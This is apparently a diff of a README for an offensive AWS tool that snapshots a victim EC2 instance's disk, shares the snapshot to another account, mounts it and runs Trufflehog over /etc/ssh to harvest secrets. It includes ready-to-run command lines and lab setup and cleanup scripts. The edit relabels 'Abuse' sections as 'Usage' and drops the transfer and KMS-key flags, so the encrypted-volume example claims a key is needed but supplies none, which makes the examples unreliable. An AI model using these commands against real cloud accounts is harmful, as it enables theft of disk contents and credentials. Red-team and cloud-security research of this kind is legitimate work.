@@ -4,35 +4,77 @@ This is an EC2 EBS post-exploitation script. The end goal is to make your life a
 
 ## Features
 - **Snapshot Creation**: Create snapshots of the root EBS volume of an EC2 instance.
-- **Cross-Account Snapshot Transfer**: Optionally modify snapshot permissions to allow transfer of the snapshot to a different AWS account. 
+- **Cross-Account Snapshot Transfer**: Automatically modify snapshot permissions to allow transfer of the snapshot to a different AWS account. 
 - **Volume Creation**: Create a new volume from the snapshot and attach it to a target EC2 instance.
 - **Volume Mounting**: Mount the created volume to a specified EC2 instance for inspection.
 - **Trufflehog Scanning**: Run Trufflehog on the mounted volume to search for secrets.
 
 ## Requirements
-- Python 3.x
-- `boto3` library
+- Go 1.20 or later
+- AWS credentials configured in `~/.aws/credentials`
 - AWS CLI configured with necessary profiles
 
+## Quick Start
+To see example commands and common usage patterns:
+```bash
+go run ec2bandit.go --examples
+```
+
 ## Usage
-### Same Account Abuse
+### Same Account Usage
 This scenario involves creating a snapshot and mounting the volume within the same AWS account.
-```
-python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-09639c1f8c7408b0d --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json
+```bash
+go run ec2bandit.go \
+    --src-profile $src_profile \
+    --dst-profile $dst_profile \
+    --src-region us-east-1 \
+    --dst-region us-east-1 \
+    --mount-path /root/blah \
+    --pillage \
+    --ssh-key-path ~/.ssh/id_rsa \
+    --target-ec2 i-09639c1f8c7408b0d \
+    --mount-host i-06549773ee1b5a056 \
+    --pillage-path /etc/ssh \
+    --out-file ./trufflehog.out \
+    --json
 ```
 
-### Cross-Account Abuse via Snapshot Transfer
-This scenario involves creating a snapshot in one AWS account, transferring it to another account, and then creating and mounting the volume in the destination account.
+### Cross-Account Usage
+This scenario involves creating a snapshot in one AWS account and creating/mounting the volume in the destination account.
 
-```
-python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-062fb4910e81569b1 --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json --transfer
+```bash
+go run ec2bandit.go \
+    --src-profile $src_profile \
+    --dst-profile $dst_profile \
+    --src-region us-east-1 \
+    --dst-region us-east-1 \
+    --mount-path /root/blah \
+    --pillage \
+    --ssh-key-path ~/.ssh/id_rsa \
+    --target-ec2 i-062fb4910e81569b1 \
+    --mount-host i-06549773ee1b5a056 \
+    --pillage-path /etc/ssh \
+    --out-file ./trufflehog.out \
+    --json
 ```
 
-### Cross-Account Abuse with Encrypted EBS 
+### Cross-Account Usage with Encrypted EBS 
 Requires knowing the KMS key used to encrypt the volume. Creates and transfers the snapshot, handling decryption / reencryption for you. 
 
-```
-python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-062fb4910e81569b1 --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json --transfer --kms-key-id arn:aws:kms:us-east-1:123456789012:key/abcd1234-56ef-78gh-90ij-klmn1234opqr
+```bash
+go run ec2bandit.go \
+    --src-profile $src_profile \
+    --dst-profile $dst_profile \
+    --src-region us-east-1 \
+    --dst-region us-east-1 \
+    --mount-path /root/blah \
+    --pillage \
+    --ssh-key-path ~/.ssh/id_rsa \
+    --target-ec2 i-062fb4910e81569b1 \
+    --mount-host i-06549773ee1b5a056 \
+    --pillage-path /etc/ssh \
+    --out-file ./trufflehog.out \
+    --json
 ```
 
 ## Arguments
@@ -48,8 +90,10 @@ python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --sr
 - `--pillage-path`: The path within the mounted volume where Trufflehog will be run.
 - `--out-file`: The path where the Trufflehog output will be saved.
 - `--json`: Flag to enable JSON output format for Trufflehog.
-- `--transfer`: Flag to transfer the snapshot from the source account to the destination account.
 - `--retain`: Retain the snapshot and volume after processing, instead of deleting them.
+- `--debug`: Enable debug logging.
+- `--no-banner`: Disable the banner display.
+- `--examples`: Show example commands and usage patterns.
 
 # AWS EC2 Helper Scripts
 
@@ -59,13 +103,12 @@ This repository contains two helper scripts, `create_ec2.sh` and `delete_all.sh`
 
 ### `create_ec2.sh`
 
-This script automates the creation of an EC2 instance in a specified AWS region. The script is designed to apply a specific tag (`TrufflehogTesting`) to both the EC2 instance and its associated EBS volume.
+- This script automates the creation of an EC2 instance in a specified AWS region 
+- The script is designed to apply a specific tag (`TrufflehogTesting`) to both the EC2 instance and its associated EBS volume
 
-#### Usage
-
-`bash create_ec2.sh --profile PROFILE_NAME --region REGION --instance-profile INSTANCE_PROFILE --ip-allowlist IP_ADDRESS --key KEY_NAME --image-id IMAGE_ID --instance-type INSTANCE_TYPE`
-
-#### Parameters
+```bash
+bash create_ec2.sh --profile PROFILE_NAME --region REGION --instance-profile INSTANCE_PROFILE --ip-allowlist IP_ADDRESS --key KEY_NAME --image-id IMAGE_ID --instance-type INSTANCE_TYPE
+```
 
 - `--profile`: The AWS CLI profile to use for authentication 
 - `--region`: The AWS region where the instance will be created (e.g., `us-east-1`).
@@ -75,28 +118,19 @@ This script automates the creation of an EC2 instance in a specified AWS region.
 - `--image-id`: The ID of the Amazon Machine Image (AMI) to use for the instance 
 - `--instance-type`: The type of instance to create (e.g., `t3.micro`).
 
-#### Example
-
-`bash create_ec2.sh --profile YOUR_PROFILE --region us-east-1 --instance-profile SSMInstanceProfile --ip-allowlist `curl -s ifconfig.me`/32 --key YOUR_KEY --image-id YOUR_AMI_ID --instance-type t3.micro`
-
 This command will create an EC2 instance with the tag `TrufflehogTesting` applied to both the instance and its associated EBS volume.
 
 ### `delete_all.sh`
 
-This script automates the deletion of all EC2 instances, EBS volumes, and snapshots that have been tagged with `TrufflehogTesting`. It provides an easy way to clean up resources after testing.
+- This script automates the deletion of all EC2 instances, EBS volumes, and snapshots that have been tagged with `TrufflehogTesting`
+- It provides an easy way to clean up resources after testing
 
-#### Usage
-
-`bash delete_all.sh --profile PROFILE_NAME --region REGION`
-
-#### Parameters
+```bash
+bash delete_all.sh --profile PROFILE_NAME --region REGION
+```
 
 - `--profile`: The AWS CLI profile to use for authentication  
 - `--region`: The AWS region where the resources are located  
-
-#### Example
-
-`bash delete_all.sh --profile YOUR_PROFILE --region us-east-1`
 
 This command will delete all EC2 instances, EBS volumes, and snapshots in the specified region that have been tagged with `TrufflehogTesting`.
 
